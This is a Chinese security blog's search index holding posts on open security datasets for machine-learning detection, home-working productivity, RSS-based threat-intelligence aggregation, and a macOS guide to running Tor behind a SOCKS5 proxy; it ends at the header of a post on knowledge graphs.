<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>安全领域内的开放数据集</title>
      <link href="/2021/03/25/%E5%BC%80%E6%94%BE%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E9%9B%86%E6%95%B4%E7%90%86/"/>
      <url>/2021/03/25/%E5%BC%80%E6%94%BE%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E9%9B%86%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="安全领域内的开放数据集"><a href="#安全领域内的开放数据集" class="headerlink" title="安全领域内的开放数据集"></a>安全领域内的开放数据集</h1><p>整理、汇总网络安全方面的开放数据集，在<a href="https://github.com/jivoi/awesome-ml-for-cybersecurity" target="_blank" rel="noopener">awesome-ml-for-cybersecurity</a>和<a href="https://xz.aliyun.com/u/395" target="_blank" rel="noopener"><strong>wstart</strong></a>师傅的文章[1]基础上进行补充和修改。</p><p>同步更新位于<a href="https://y1ng.org/TheRoadOfSO/">安全运营之路</a>文档：<a href="https://y1ng.org/TheRoadOfSO/0x4_%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/%3E%3E%3E%20%E6%95%B0%E6%8D%AE%E9%9B%86/0x0_%E5%BC%80%E6%94%BE%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E9%9B%86%E6%95%B4%E7%90%86/">Link</a></p><h2 id="网络安全相关"><a href="#网络安全相关" class="headerlink" title="网络安全相关"></a>网络安全相关</h2><ul><li><p><a href="http://www.secrepo.com/" target="_blank" rel="noopener">Samples of Security Related Data</a></p></li><li><p><a href="https://www.ll.mit.edu/r-d/datasets" target="_blank" rel="noopener">DARPA Intrusion Detection Data Sets</a> [ <a href="https://www.ll.mit.edu/r-d/datasets/1998-darpa-intrusion-detection-evaluation-dataset" target="_blank" rel="noopener">1998</a> / <a href="https://www.ll.mit.edu/r-d/datasets/1999-darpa-intrusion-detection-evaluation-dataset" target="_blank" rel="noopener">1999</a> ]</p></li><li><p><a href="https://stratosphereips.org/category/dataset.html" target="_blank" rel="noopener">Stratosphere IPS Data Sets</a></p></li><li><p><a href="http://csr.lanl.gov/data/" target="_blank" rel="noopener">Open Data Sets</a></p></li><li><p><a href="http://www.westpoint.edu/crc/SitePages/DataSets.aspx" target="_blank" rel="noopener">Data Capture from National Security Agency</a></p></li><li><p><a href="https://www.unsw.adfa.edu.au/australian-centre-for-cyber-security/cybersecurity/ADFA-IDS-Datasets/" target="_blank" rel="noopener">The ADFA Intrusion Detection Data Sets</a></p><ul><li><strong>ADFA IDS Datasets</strong> 是澳大利亚国防大学发布的一套关于HIDS的数据集。分为Linux（ADFA-LD）和Windows（ADFA-WD）</li><li>内容类型：主机行为</li><li>是否特征化：是</li><li>使用范围：入侵检测</li></ul></li><li><p><a href="https://github.com/defcom17/NSL_KDD" target="_blank" rel="noopener">NSL-KDD Data Sets</a></p></li><li><p><a href="http://sysnet.ucsd.edu/projects/url/" target="_blank" rel="noopener">Malicious URLs Data Sets</a></p></li><li><p><a href="http://csr.lanl.gov/data/cyber1/" target="_blank" rel="noopener">Multi-Source Cyber-Security Events</a></p></li><li><p><a href="http://kdd.ics.uci.edu/databases/kddcup99/kddcup99.html" target="_blank" rel="noopener">KDD Cup 1999 Data</a></p><ul><li>KDD竞赛在1999年举行时采用的数据集。1998年美国国防部高级规划署（DARPA）在MIT林肯实验室进行了一项入侵检测评估项目收集而来的数据</li><li>内容类型：网络流量、主机行为</li><li>是否特征化：是</li><li>适用范围：主机入侵检测、异常流量监控</li></ul></li><li><p><a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">Web Attack Payloads</a></p></li><li><p><a href="https://github.com/faizann24/Fwaf-Machine-Learning-driven-Web-Application-Firewall" target="_blank" rel="noopener">WAF Malicious Queries Data Sets</a></p></li><li><p><a href="https://github.com/marcoramilli/MalwareTrainingSets" target="_blank" rel="noopener">Malware Training Data Sets</a></p></li><li><p><a href="https://github.com/jzadeh/Aktaion/tree/master/data" target="_blank" rel="noopener">Aktaion Data Sets</a></p></li><li><p><a href="https://www.dropbox.com/sh/7fo4efxhpenexqp/AADHnRKtL6qdzCdRlPmJpS8Aa/CRIME?dl=0" target="_blank" rel="noopener">CRIME Database from DeepEnd Research</a></p></li><li><p><a href="http://www.netresec.com/?page=PcapFiles" target="_blank" rel="noopener">Publicly available PCAP files</a></p></li><li><p><a href="https://plg.uwaterloo.ca/~gvcormac/treccorpus07/" target="_blank" rel="noopener">2007 TREC Public Spam Corpus</a></p></li><li><p><a href="https://www.sec.cs.tu-bs.de/~danarp/drebin/" target="_blank" rel="noopener">Drebin Android Malware Dataset</a></p></li><li><p><a href="https://monkey.org/~jose/phishing/" target="_blank" rel="noopener">PhishingCorpus Datset</a></p></li><li><p><a href="https://github.com/endgameinc/ember" target="_blank" rel="noopener">EMBER</a></p></li><li><p><a href="https://vizsec.org/data/" target="_blank" rel="noopener">Vizsec Research</a></p></li><li><p><a href="http://bigdata.ise.bgu.ac.il/sherlock/index.html#/" target="_blank" rel="noopener">SHERLOCK</a></p></li><li><p><a href="https://github.com/gubertoli/ProbingDataset" target="_blank" rel="noopener">Probing / Port Scan - Dataset</a></p></li><li><p><a href="http://icsdweb.aegean.gr/awid/" target="_blank" rel="noopener">Aegean Wireless Intrusion Dataset (AWID)</a></p></li><li><p><a href="http://www.isi.csic.es/dataset/" target="_blank" rel="noopener">HTTP DATASET CSIC 2010</a></p><ul><li><strong>HTTP DATASET CSIC 2010</strong> 包含已经标注过的针对web服务的请求。数据量约5w条。下载地址已经为我们分类好了训练用的正常数据，测试用的正常数据，测试用的异常数据</li><li>内容类型：网络流量</li><li>是否特征化：否</li><li>使用范围：WAF类产品、异常流量监控</li></ul></li><li><p><a href="http://www.secrepo.com/honeypot/honeypot.json.zip" target="_blank" rel="noopener">honeypot.json</a></p><ul><li>honeypot 是由多种类型的蜜罐采集回来的数据。主要是WEB请求。约99万条数据。由于没有分类和规整，需要自己数据清洗，也可以用作校验模型的数据</li><li>内容类型：网络流量</li><li>是否特征化：否</li><li>使用范围：WAF类产品、异常流量监控</li></ul></li><li><p><a href="https://xz.aliyun.com/t/1879" target="_blank" rel="noopener">Masquerading User Data</a></p><ul><li><strong>Masquerading User Data</strong>（也被称为SEA数据集） 是Matthias Schonlau 教授通过正常数据构造出来用于训练和检测 Masquerading User攻击的数据集(内部攻击者分为两种，一种是内鬼[Traitor]，一种是窃取了身份凭证的正常用户的伪装者[Masquerading User]）由于是构造出来的数据，缺乏实际攻击的真实性，在一定程度上，训练出来的模型会存在一定的过拟</li><li>内容类型：主机行为</li><li>是否特征化：否</li><li>使用范围：入侵检测类、用户异常行为识别</li></ul></li><li><p><a href="http://data.netlab.360.com/dga/" target="_blank" rel="noopener">360DGA</a></p><ul><li>360安全厂商提供的DGA数据集，用于DAG域名检测，可作为黑样本</li><li>内容类型：文本样本</li><li>是否特征化：否</li><li>使用范围：入侵检测、异常流量、WAF</li></ul></li><li><p><a href="https://www.secrepo.com/misc/zeus_dga_domains.txt.zip" target="_blank" rel="noopener">Gameover Zeus DGA sample</a> 2014</p><ul><li>Zeus P2P僵尸网络的DGA恶意样本数据</li><li>内容类型：文本样本</li><li>是否特征化：否</li><li>使用范围：入侵检测、异常流量、WAF</li></ul></li><li><p><a href="http://www.secrepo.com/auth.log/auth.log.gz" target="_blank" rel="noopener">auth.log</a></p><ul><li><strong>auth.log</strong> 主要是都是登录失败的日志 适合用作判断是爆破登录还是正常的输错密码</li><li>内容类型：主机行为</li><li>是否特征化：否</li><li>使用范围：入侵检测、异常流量、WAF</li></ul></li><li><p><a href="https://github.com/faizann24/Using-machine-learning-to-detect-malicious-URLs" target="_blank" rel="noopener">malicious-URLs</a></p><ul><li><strong>malicious-URLs</strong> 在Github上面一个 使用机器学习去检测恶意URL的项目 ，里面有一个训练集，有做标记是正常的URL还是恶意的URL</li><li>内容类型：文本样本</li><li>是否特征化：否</li><li>使用范围：入侵检测、异常流量、WAF</li></ul></li><li><p><a href="https://mcfp.weebly.com/mcfp-dataset.html" target="_blank" rel="noopener">The Malware Capture Facility Project</a></p><ul><li><strong>MCFP</strong> 是捷克理工大学 (CTU)用于捕抓恶意软件的而抓去的网络流量。里面的数据非常多，有他们自己分析出来的恶意流量，也有所有的流量，包括网络文件、日志、DNS请求等</li><li>内容类型：网络流量</li><li>是否特征化：否</li><li>使用范围：异常流量、WAF</li></ul></li><li><p><a href="https://github.com/BaRRaKudaRain/MalwareDB" target="_blank" rel="noopener">MalwareDB</a></p><ul><li>恶意软件库，包含恶意软件列表hash、检测结果、所属域名等数据</li><li>内容类型：文本样本</li><li>使用范围:：特征库、入侵检测</li></ul></li><li><p><a href="https://github.com/alphasoc/flightsim" target="_blank" rel="noopener">flightsim</a></p><ul><li>一个工具，可以生成数据恶意流量数据，模拟DNS隧道、DGA通信、对活跃的C2服务器请求和其他一些可疑的流量数据</li><li>内容类型：网络流量（模拟）</li><li>是否特征化：否</li><li>使用范围：异常流量、WAF、入侵检测</li></ul></li><li><p><a href="https://github.com/OTRF/mordor" target="_blank" rel="noopener">mordor</a></p><ul><li>模拟攻防对抗生成的安全事件数据，以JSON格式提供，并且按照<a href="https://attack.mitre.org/wiki/Main_Page" target="_blank" rel="noopener">ATT＆CK框架</a>的定义。可以用于对攻防技术（TTPs）的检测。<a href="https://mordordatasets.com/introduction.html" target="_blank" rel="noopener">说明文档</a>。</li><li>内容类型：文本样本</li><li>是否特征化：否</li><li>适用范围：入侵检测、行为识别</li></ul></li></ul><h2 id="邮件相关"><a href="#邮件相关" class="headerlink" title="邮件相关"></a>邮件相关</h2><ul><li><a href="http://archive.ics.uci.edu/ml/datasets/Spambase" target="_blank" rel="noopener">SpamBase</a><ul><li>一个入门级的垃圾邮件分类训练集，已被特征化处理。特征为统计的关键字、特殊符号的词频等，一共58个属性，最后一位是垃圾邮件标记位</li><li>内容类型：文本样本、邮件（特征化）</li><li>是否特征化：是</li><li>适用范围：垃圾邮件检测</li></ul></li></ul><h2 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h2><ul><li><p>SecRepo.com - Samples of Security Related Data</p><ul><li>整理大量安全相关的数据集，包括网络、恶意软件、文件等</li><li><a href="https://www.secrepo.com/" target="_blank" rel="noopener">官网</a>、<a href="https://github.com/sooshie/secrepo" target="_blank" rel="noopener">GitHub</a></li></ul></li><li><p>Security Data Analysis</p><ul><li>总共4个lab，包含http，连接记录，域名，host等</li><li><a href="https://github.com/sooshie/Security-Data-Analysis" target="_blank" rel="noopener">GitHub</a></li></ul></li><li><p>webshell收集项目</p><ul><li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">GitHub</a></li></ul></li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] 机器学习之安全数据集，<a href="https://xz.aliyun.com/u/395" target="_blank" rel="noopener"><strong>wstart</strong></a>，<a href="https://xz.aliyun.com/t/1879" target="_blank" rel="noopener">https://xz.aliyun.com/t/1879</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全数据分析 </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在家高效工作12小时？</title>
      <link href="/2021/03/10/%E5%A6%82%E4%BD%95%E5%9C%A8%E5%AE%B6%E9%AB%98%E6%95%88%E5%B7%A5%E4%BD%9C12%E5%B0%8F%E6%97%B6/"/>
      <url>/2021/03/10/%E5%A6%82%E4%BD%95%E5%9C%A8%E5%AE%B6%E9%AB%98%E6%95%88%E5%B7%A5%E4%BD%9C12%E5%B0%8F%E6%97%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="如何在家高效工作12小时？"><a href="#如何在家高效工作12小时？" class="headerlink" title="如何在家高效工作12小时？"></a>如何在家高效工作12小时？</h1><p>如题所示，如何在家高效工作，或者如何在周末让自己保持高效学习，一直是困扰我的一个问题。最近看到“老石谈芯”频道的一个视频[1]，归纳了几个点，是一个很好的解答，因此做一下整理，并加上自己的一些想法，感谢老石。</p><h2 id="整理每日重点和待办事项"><a href="#整理每日重点和待办事项" class="headerlink" title="整理每日重点和待办事项"></a>整理每日重点和待办事项</h2><p>30分钟内，不仅是工作，也可以是生活上的事项</p><h2 id="划分独立的工作区域"><a href="#划分独立的工作区域" class="headerlink" title="划分独立的工作区域"></a>划分独立的工作区域</h2><p>生活区域和工作区域相互分离</p><h2 id="提前准备会议内容"><a href="#提前准备会议内容" class="headerlink" title="提前准备会议内容"></a>提前准备会议内容</h2><p>让会议、交流更加高效，类似于上课预习</p><p>会议可以安排在上午，方便下午空出整块的工作时间</p><h2 id="避免多任务切换"><a href="#避免多任务切换" class="headerlink" title="避免多任务切换"></a>避免多任务切换</h2><p>不断切换要做的事情是非常低效的，尽量避免在非常多的任务里切换，尽量集中输出、解决技术问题。类似于高性能场景下避免中断和任务切换的发生。</p><h2 id="生活时间避免工作"><a href="#生活时间避免工作" class="headerlink" title="生活时间避免工作"></a>生活时间避免工作</h2><p>留出陪伴家人、锻炼身体的独立时间，在生活时间里尽量避免任何形式的工作。在家办公最容易发生问题的一点，就是生活和工作的边界变得模糊。</p><h2 id="保持学术研究"><a href="#保持学术研究" class="headerlink" title="保持学术研究"></a>保持学术研究</h2><p>工程狮的主要工作就是做项目、进行工程化的实践。但同时也需要保持前沿技术的研究，可以尝试在晚间、工作之外的时间里做一下较为前沿的课题研究。</p><p>阅读、整理领域内的文献，给出自己的研究计划，在阅读时根据文章质量有选择性地阅读。</p><h2 id="保持实践学习"><a href="#保持实践学习" class="headerlink" title="保持实践学习"></a>保持实践学习</h2><p>在安全领域内，很多知识都是需要跨领域的，所以在保持自己细分方向的研究时，也要注意工程实践类知识、经验、技巧的积累。例如，自己每天需要做到：</p><ul><li>每日一个恶意流量的分析，产出一个报告或笔记<ul><li><a href="https://y1ng.org/traffic-analysis-train/">https://y1ng.org/traffic-analysis-train/</a></li></ul></li><li>每日一个靶机、漏洞的练习，产出报告或笔记<ul><li><a href="https://y1ng.org/vuln-training/">https://y1ng.org/vuln-training/</a></li></ul></li></ul><h2 id="琐碎任务集中处理"><a href="#琐碎任务集中处理" class="headerlink" title="琐碎任务集中处理"></a>琐碎任务集中处理</h2><p>例如自己会做的，在知识星球分享资料、写博客、公众号文章等，可以放在“琐碎时间段“内统一处理。</p><p>Tips：可以在阅读文章时，尝试自己去进行120字以内的概括和归纳。一方面可以训练对内容的归纳总结，另一方面也是将他人文章和自己的知识相结合，帮助融入到<strong>自己的知识体系</strong>中。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1]《芯片工程师的一天 | 我如何每天高效工作12小时？【经验分享】》，<a href="https://www.youtube.com/channel/UC5mVFJf71Ax6TJZcbmTnilw" target="_blank" rel="noopener">老石谈芯</a>，<a href="https://www.youtube.com/watch?v=P4bQEvuNapk&amp;ab_channel=%E8%80%81%E7%9F%B3%E8%B0%88%E8%8A%AF" target="_blank" rel="noopener">https://www.youtube.com/watch?v=P4bQEvuNapk&amp;ab_channel=%E8%80%81%E7%9F%B3%E8%B0%88%E8%8A%AF</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于RSS的情报聚合方案</title>
      <link href="/2021/01/17/%E5%9F%BA%E4%BA%8ERSS%E7%9A%84%E6%83%85%E6%8A%A5%E8%81%9A%E5%90%88%E6%96%B9%E6%A1%88/"/>
      <url>/2021/01/17/%E5%9F%BA%E4%BA%8ERSS%E7%9A%84%E6%83%85%E6%8A%A5%E8%81%9A%E5%90%88%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h1 id="基于RSS的情报聚合方案"><a href="#基于RSS的情报聚合方案" class="headerlink" title="基于RSS的情报聚合方案"></a>基于RSS的情报聚合方案</h1><p>网络上公开的新闻、资讯、文章等，是开源情报收集的重要组成。但这些信息源来源不同，并且对订阅的支持方式各不相同（公众号订阅、RSS、邮件订阅），且有不同的反爬策略等限制，导致我们每天在阅读相关安全资讯时需要辗转不同的平台，不太方便。所以在本文中会整理一个简单的思路，提出聚合一些常用的信息源的方式。</p><h2 id="订阅方式"><a href="#订阅方式" class="headerlink" title="订阅方式"></a>订阅方式</h2><p>本方案选择最常用的RSS订阅方式</p><h2 id="平台选择"><a href="#平台选择" class="headerlink" title="平台选择"></a>平台选择</h2><p>使用RSS订阅，我们可以选择在线的RSS订阅平台，也可以使用本机软件，两者各有好坏。本方案选择使用在线的RSS订阅平台，主要的好处有：</p><ul><li>可实现托管形式的定时爬取、更新</li><li>本地无缓存占用</li><li>避免了部分订阅源由于GFW而产生的网络问题（使用外网平台）</li><li>可以隐藏订阅者的本机信息</li></ul><p>劣势是：</p><ul><li>订阅源到一定数量需要付费，且有缓存、更新时间等限制</li><li>对平台来说，暴露了你自己的情报源（一般来说问题不大）</li></ul><p>目前常用的在线RSS订阅平台有<a href="https://feedly.com/" target="_blank" rel="noopener">Feedly</a>、<a href="https://www.inoreader.com/" target="_blank" rel="noopener">Inoreader</a>、<a href="https://feedbin.com/" target="_blank" rel="noopener">Feedbin</a>等，笔者更偏爱Inoreader一些。以下是Inoreader支持的一些功能（Feedly基本也具有）：</p><ul><li>支持订阅webpage，不必提供RSS</li><li>支持订阅Twitter、Youtube、Facebook、Reddit等</li><li>支持邮件简讯订阅</li><li>还支持订阅Inoreader用户</li><li>多平台客户端支持，Web的体验比较简介专注</li></ul><h2 id="情报源聚合"><a href="#情报源聚合" class="headerlink" title="情报源聚合"></a>情报源聚合</h2><h3 id="支持RSS的网站"><a href="#支持RSS的网站" class="headerlink" title="支持RSS的网站"></a>支持RSS的网站</h3><p>直接在平台添加RSS订阅地址即可。</p><p>Tips：可以使用浏览器插件来探测网站的RSS链接，更加方便，这样的插件有：<a href="">RSS Reader Extension (by Inoreader)</a>、<a href="">RSS Hub</a></p><h3 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h3><p>微信公众号本身不支持RSS订阅，但可以使用一些平台服务进行转换。例如使用<a href="https://werss.app/" target="_blank" rel="noopener">WeRSS</a>，可搜索微信公众号名字，直接转换为RSS链接，然后在Inoreader中添加即可。</p><p><del>P.S. 该服务的付费套餐价格也比较亲民。</del></p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/image-20210117152232495.png" alt="image-20210117152232495"></p><p>图：WeRSS使用示例</p><h3 id="Twitter"><a href="#Twitter" class="headerlink" title="Twitter"></a>Twitter</h3><p>Inoreader支持直接订阅。</p><h3 id="Email-Newsletters"><a href="#Email-Newsletters" class="headerlink" title="Email Newsletters"></a>Email Newsletters</h3><p>Inoreader支持直接订阅。</p><h2 id="使用RSSHub"><a href="#使用RSSHub" class="headerlink" title="使用RSSHub"></a>使用RSSHub</h2><blockquote><p>  RSSHub 是一个开源、简单易用、易于扩展的 RSS 生成器，可以给任何奇奇怪怪的内容生成 RSS 订阅源。RSSHub 借助于开源社区的力量快速发展中，目前已适配数百家网站的上千项内容</p><p>  文档：<a href="https://docs.rsshub.app/" target="_blank" rel="noopener">https://docs.rsshub.app/</a></p><p>  项目：<a href="https://github.com/DIYgod/RSSHub" target="_blank" rel="noopener">https://github.com/DIYgod/RSSHub</a></p></blockquote><p>// TODO 使用RSSHub转化订阅源，用以聚合情报，后续更新</p>]]></content>
      
      
      
        <tags>
            
            <tag> OSINT </tag>
            
            <tag> 情报 </tag>
            
            <tag> 一些小方案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在macOS上设置Tor代理</title>
      <link href="/2020/10/05/%E5%9C%A8macOS%E4%B8%8A%E8%AE%BE%E7%BD%AETor%E4%BB%A3%E7%90%86/"/>
      <url>/2020/10/05/%E5%9C%A8macOS%E4%B8%8A%E8%AE%BE%E7%BD%AETor%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="在macOS上设置Tor代理"><a href="#在macOS上设置Tor代理" class="headerlink" title="在macOS上设置Tor代理"></a>在macOS上设置Tor代理</h1><p><strong>注：仅作技术探讨</strong></p><p>相信很多接触Tor（The Onion Router，洋葱路由器）网络的同学，刚开始都是从使用<a href="https://www.torproject.org/download/" target="_blank" rel="noopener">Tor Browser</a>开始的。在后面使用过程中，我也逐渐以上到，Tor作为一种代理技术，本身是可以脱离浏览器的捆绑，应用在网络活动的各个角落的。比如说进行匿名访问Onion网站、通过Tor网络传输敏感文件，乃至使用各种软件服务时设置Tor代理隐藏身份。</p><p>因为洋葱网络是由N个志愿节点组成的，所以我们初期是不需要自己<a href="https://zhuanlan.zhihu.com/p/34358838" target="_blank" rel="noopener">搭建洋葱网络节点</a>的（后续会更，先挖个坑😉）。所以我们这里主要是在搭建Tor客户端，以及进行相关配置。</p><h2 id="0-前期准备"><a href="#0-前期准备" class="headerlink" title="0. 前期准备"></a>0. 前期准备</h2><ul><li>稳定可用的自建科学上网节点，或者使用机场服务</li><li>科学上网代理的客户端，提供代理转发。例如本篇使用的是Qv2ray</li><li><del>其他好像也不需要什么了</del></li></ul><h2 id="1-安装Tor代理"><a href="#1-安装Tor代理" class="headerlink" title="1. 安装Tor代理"></a>1. 安装Tor代理</h2><p>首先我们需要在终端安装Tor服务。对于macOS用户，我们可以使用HomeBrew一键安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install tor</span><br></pre></td></tr></table></figure><p>HomeBrew使用原生源下载比较慢，建议给终端加上科学上网代理，使用国内镜像还是不太推荐，你说你都要使用Tor了对吧。</p><h2 id="2-设置Tor的上级代理"><a href="#2-设置Tor的上级代理" class="headerlink" title="2. 设置Tor的上级代理"></a>2. 设置Tor的上级代理</h2><p>由于GFW，我们的不能直连Tor网络，需要给Tor设置上级代理。Tor服务本身支持，只需要修改配置文件即可。在macOS中，配置文件在：<code>/usr/local/etc/tor/torrc.sample</code>，配置文件中包含很多配置介绍，有更多需求的同学可以仔细看下备注。</p><p>先备份一下配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp /usr/<span class="built_in">local</span>/etc/tor/torrc.sample /usr/<span class="built_in">local</span>/etc/tor/torrc.sample.BK</span><br></pre></td></tr></table></figure><p>接下来，我们需要编辑<code>torrc.sample</code>，在文件头部加入科学上网客户端的socks代理信息<code>SOCKS5Proxy 127.0.0.1:1086</code>，最后去掉起sample后缀使其生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vim /usr/<span class="built_in">local</span>/etc/tor/torrc.sample</span><br><span class="line">...</span><br><span class="line">SOCKS5Proxy 127.0.0.1:1086</span><br></pre></td></tr></table></figure><p>这里再给不太清楚同学补充一下，之所以填入<code>127.0.0.1:1086</code>是因为这里使用的科学上网工具Qv2ray的监听地址是<code>127.0.0.1</code>、Socks端口为<code>1086</code>，如下图所示：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20201005214715.png"></p><p>图：Qv2ray的客户端配置信息</p><p>在配置文件<code>torrc</code>中加入这个科学上网的上级代理信息后，我们就可以通过科学上网代理去连接洋葱网络啦。</p><h2 id="3-运行Tor服务"><a href="#3-运行Tor服务" class="headerlink" title="3.  运行Tor服务"></a>3.  运行Tor服务</h2><p>我们使用HomeBrew的<code>services</code>命令来管理服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看使用HomeBrew安装的服务列表，检查是否有成功安装，显示有tor</span></span><br><span class="line">$ brew services</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 开启Tor代理</span></span><br><span class="line">$ brew services start tor</span><br></pre></td></tr></table></figure><p>开启Tor服务后，Tor服务会在本地进行Socks5代理，监听的地址为<code>localhost</code>，端口号为<code>9050</code></p><p>因此，我们在需要使用Tor代理时，只需要走<code>127.0.0.1:9050</code>即可。</p><h2 id="4-在Chrome中配置"><a href="#4-在Chrome中配置" class="headerlink" title="4. 在Chrome中配置"></a>4. 在Chrome中配置</h2><p>我们可以直接在Chrome的设置中进行网络代理设置，也可以下载代理管理插件，例如<a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif" target="_blank" rel="noopener">SwitchyOmega</a>。如下图所示，就是我们在SwitchyOmega插件中进行Tor的Socks代理配置：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20201005215803.png"></p><p>配置好，apply后，选择该代理模式，就可以<del>愉快地</del>使用Tor代理进行网上冲浪啦～</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20201005220258.png"></p><p>图：访问<a href="http://jh32yv5zgayyyts3.onion/" target="_blank" rel="noopener">Hidden Wiki（.onion）</a></p><h2 id="补：5-终端Tor代理监视"><a href="#补：5-终端Tor代理监视" class="headerlink" title="补：5. 终端Tor代理监视"></a>补：5. 终端Tor代理监视</h2><p>Tor代理服务在终端中本身没有提供相关监视信息，我们需要一个对Tor的监视面板。这里我们采用官方推荐的<a href="https://nyx.torproject.org/" target="_blank" rel="noopener">Nyx</a>，它可以查看Tor代理的带宽图、事件日志和连接信息等。</p><p>同样，我们可以在macOS中使用HomeBrew一键安装:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install nyx</span><br></pre></td></tr></table></figure><p>然后，我们需要在Tor配置文件中开启控制接口，去掉<code>ControlPort 9051</code>参数前的注释符，注意，这个9051端口也正好是Nyx的默认attach端口，如果需要改变该端口可以使用Nyx 的<code>-i</code>参数改变：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ vim /usr/<span class="built_in">local</span>/etc/tor/torrc</span><br><span class="line">···</span><br><span class="line"><span class="comment">## The port on which Tor will listen for local connections from Tor</span></span><br><span class="line"><span class="comment">## controller applications, as documented in control-spec.txt.</span></span><br><span class="line">ControlPort 9051</span><br><span class="line"><span class="comment">## If you enable the controlport, be sure to enable one of these</span></span><br><span class="line"><span class="comment">## authentication methods, to prevent attackers from accessing it.</span></span><br><span class="line">···</span><br></pre></td></tr></table></figure><p>如果不开启该选项的话，Nyx无法attach到Tor代理服务，会报以下的错误:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Unable to connect to tor. Are you sure it<span class="string">'s running?</span></span><br><span class="line"><span class="string"># 或者是</span></span><br><span class="line"><span class="string">please check in your torrc that 9050 is the controlport. maybe you configured it to be the orport or socksport instead?</span></span><br></pre></td></tr></table></figure><p>我们也可以修改上面的Tor配置文件，此时用Nyx的<code>-i</code>参数即可设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用-i参数可以指定另外的attach地址、端口</span></span><br><span class="line">$ nyx -i 192.168.0.0:9052</span><br></pre></td></tr></table></figure><p>完成上述配置后，我们显示的效果如下图所示，并且有多种功能支持：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20201006213543.png"></p><p>图：Nyx在终端开启后的效果</p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> Tor </tag>
            
            <tag> 跨过山河大海　 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识图谱及其在安全领域的应用</title>
      <link href="/2020/09/26/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%8F%8A%E5%85%B6%E5%9C%A8%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>/2020/09/26/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%8F%8A%E5%85%B6%E5%9C%A8%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
